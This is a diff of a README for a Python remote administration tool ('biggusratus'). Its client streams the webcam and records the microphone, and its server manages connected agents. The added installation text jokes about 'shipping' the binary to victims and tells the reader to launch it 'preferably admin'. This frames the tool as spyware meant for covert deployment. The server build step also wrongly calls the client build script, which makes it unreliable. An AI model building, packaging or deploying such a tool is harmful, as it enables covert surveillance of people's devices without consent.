@@ -10,6 +10,50 @@ Remote Administration Tool (RAT) implemented in Python. The project consists of 
 
 Communication occurs via encrypted TCP sockets.
 
+## Installation
+
+You can either run the source code directly or build an executable (in order to ship it 👺)
+
+### Source code
+
+Install every deps with poetry
+
+```bash
+poetry install
+```
+
+Run the client
+
+```bash
+poetry run client
+```
+
+Run the server
+
+```bash
+poetry run server
+```
+
+### Building an executable
+
+Build as standalone binary executable, because you are a ratus :
+
+Build the client
+
+```bash
+python ./scripts/build_client.py
+```
+
+Build the server
+
+```bash
+python ./scripts/build_client.py
+```
+
+The binary will be output to `dist/` folder.
+
+Double click on it to launch, preferably admin.
+
 ## Client
 
 ### Core
@@ -36,25 +80,6 @@ Communication occurs via encrypted TCP sockets.
 | `webcam_stream`   | Stream webcam video                 | `action`: start/stop             | Video stream                       |
 | `record_audio`    | Record from microphone              | `action`: start/stop, `duration` | Audio data (WAV)                   |
 
-### Building
-
-Build the client as a standalone binary executable:
-
-```bash
-chmod +x scripts/build-client.sh
-./scripts/build-client.sh
-```
-
-The binary will be output to `dist/biggusratus-client`.
-
-### Running
-
-You can run the client with
-
-```bash
-poetry run client
-```
-
 ## Server
 
 ### Core
@@ -74,26 +99,6 @@ poetry run client
 | `exit`        | Disconnect selected agent    |
 | `quit`        | Shutdown server              |
 | `help`        | Display available commands   |
-
-### Building
-
-Build the server as a standalone binary executable:
-
-```bash
-chmod +x scripts/build-server.sh
-./scripts/build-server.sh
-```
-
-The binary will be output to `dist/biggusratus-server`.
-
-
-### Running
-
-You can run the server with
-
-```bash
-poetry run server
-```
 
 ### Web Interface
 
@@ -153,9 +158,6 @@ Use Poetry for ALL dependencies. Never use pip directly.
 # Adding dependencies
 poetry add cryptography
 poetry add --group dev pytest
-
-# Installing project
-poetry install
 ```
 
 ### Logging
